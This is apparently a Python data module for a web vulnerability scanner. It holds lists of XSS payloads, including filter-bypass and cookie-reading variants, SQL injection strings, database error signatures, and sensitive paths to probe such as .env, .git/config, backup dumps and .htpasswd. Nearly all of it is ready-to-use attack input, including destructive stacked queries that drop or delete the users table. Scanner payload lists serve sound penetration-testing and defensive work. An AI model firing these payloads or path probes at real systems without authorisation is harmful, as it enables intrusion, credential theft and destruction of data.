"""扩展 Payload 库"""

# XSS Payloads - 扩展版
XSS_PAYLOADS_V3 = [
    # 基础反射型
    {"type": "reflected", "payload": "<script>alert(1)</script>"},
    {"type": "reflected", "payload": "<img src=x onerror=alert(1)>"},
    {"type": "reflected", "payload": "<svg onload=alert(1)>"},
    {"type": "reflected", "payload": "<body onload=alert(1)>"},
    {"type": "reflected", "payload": "<iframe src='javascript:alert(1)'>"},
    
    # 事件型
    {"type": "event", "payload": "<input onfocus=alert(1) autofocus>"},
    {"type": "event", "payload": "<button onclick=alert(1)>click</button>"},
    {"type": "event", "payload": "<a href='javascript:alert(1)'>link</a>"},
    {"type": "event", "payload": "<img src='x' onerror='alert(1)'>"},
    {"type": "event", "payload": "<video src=x onerror=alert(1)>"},
    {"type": "event", "payload": "<audio src=x onerror=alert(1)>"},
    
    # 编码绕过
    {"type": "bypass", "payload": "<ScRiPt>alert(1)</sCrIpT>"},
    {"type": "bypass", "payload": "<scr<script>ipt>alert(1)</scr</script>ipt>"},
    {"type": "bypass", "payload": "<svg><script>alert`1`</script></svg>"},
    {"type": "bypass", "payload": "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"},
    {"type": "bypass", "payload": "javascript:alert(String.fromCharCode(49))"},
    
    # HTML5 向量
    {"type": "html5", "payload": "<details open ontoggle=alert(1)>"},
    {"type": "html5", "payload": "<marquee onstart=alert(1)>"},
    {"type": "html5", "payload": "<meter onmouseover=alert(1)>"},
    {"type": "html5", "payload": "<progress onmouseover=alert(1)>"},
    
    # 无括号绕过
    {"type": "nobrackets", "payload": "<img src=x onerror=alert`1`>"},
    {"type": "nobrackets", "payload": "<svg onload=alert%601%60>"},
    
    # 模板注入转XSS
    {"type": "template", "payload": "{{7*7}}"},
    {"type": "template", "payload": "${7*7}"},
    
    # DOM型检测
    {"type": "dom", "payload": "<img src=x onerror='alert(document.domain)'>"},
    {"type": "dom", "payload": "<script>alert(document.cookie)</script>"},
]


# SQL 注入 Payloads - 扩展版
SQLI_PAYLOADS_V3 = [
    # 错误型
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    '" OR "1"="1" --',
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR 1=1/*",
    
    # 联合注入
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "1 UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    
    # 布尔盲注
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND '1'='1",
    "' AND '1'='2",
    
    # 时间盲注
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
    "1 AND SLEEP(5)",
    "1' AND SLEEP(5)--",
    "1' AND SLEEP(5) #",
    "1; WAITFOR DELAY '0:0:5'--",
    "1 AND pg_sleep(5)",
    
    # 注释绕过
    "admin'--",
    "admin' #",
    "admin'/*",
    "admin' OR '1'='1",
    
    # 堆叠查询
    "1; DROP TABLE users--",
    "1; DELETE FROM users--",
    
    # 宽字节注入
    "%df' OR '1'='1",
    "%df' OR 1=1--",
]


# SQL 错误特征 - 扩展版
SQLI_ERROR_SIGNATURES_V3 = [
    # MySQL
    "SQL syntax", "mysql_fetch", "MySQL", "mysqli_",
    "Warning: mysql_", "You have an error in your SQL syntax",
    "MariaDB",
    
    # PostgreSQL
    "PostgreSQL", "PG::", "psycopg2", 
    "ERROR: syntax error at or near",
    
    # SQLite
    "SQLite", "sqlite3", "SQLITE_ERROR",
    
    # Oracle
    "ORA-", "Oracle error", "Oracle Driver",
    
    # SQL Server
    "Microsoft SQL Server", "ODBC SQL Server Driver",
    "SqlException", "System.Data.SqlClient",
    
    # 通用
    "syntax error", "unterminated string",
    "quoted string not properly terminated",
]


# 敏感路径 - 扩展版
SENSITIVE_PATHS_V3 = [
    # 版本控制
    ".git/config",
    ".git/HEAD",
    ".git/index",
    ".git/logs/HEAD",
    ".svn/entries",
    ".svn/wc.db",
    ".hg/hgrc",
    ".bzr/branch-format",
    ".DS_Store",
    
    # 配置文件
    ".env",
    ".env.local",
    ".env.production",
    ".env.bak",
    ".env~",
    "config.php",
    "config.php.bak",
    "config.php~",
    "config.json",
    "config.yaml",
    "config.yml",
    "settings.py",
    "settings.py.bak",
    "database.yml",
    "database.yaml",
    "web.config",
    "appsettings.json",
    
    # 备份文件
    "backup.sql",
    "dump.sql",
    "data.sql",
    "backup.zip",
    "backup.tar.gz",
    "backup.rar",
    "www.zip",
    "www.tar.gz",
    "site.zip",
    
    # 调试文件
    "phpinfo.php",
    "info.php",
    "test.php",
    "debug.php",
    "php.php",
    "_profiler/",
    
    # 管理后台
    "admin/",
    "administrator/",
    "admin/login",
    "admin/login.php",
    "admin/index.php",
    "manage/",
    "manager/",
    "backend/",
    "console/",
    
    # 数据库管理
    "phpmyadmin/",
    "pma/",
    "myadmin/",
    "mysql/",
    "dbadmin/",
    "adminer.php",
    "sqLiteManager/",
    
    # API 文档
    "api/swagger",
    "api/docs",
    "swagger-ui.html",
    "swagger.json",
    "v2/api-docs",
    "openapi.json",
    "api.html",
    
    # 其他敏感
    "robots.txt",
    "sitemap.xml",
    ".htaccess",
    ".htpasswd",
    "crossdomain.xml",
    "clientaccesspolicy.xml",
    ".well-known/security.txt",
    ".well-known/openid-configuration",
]
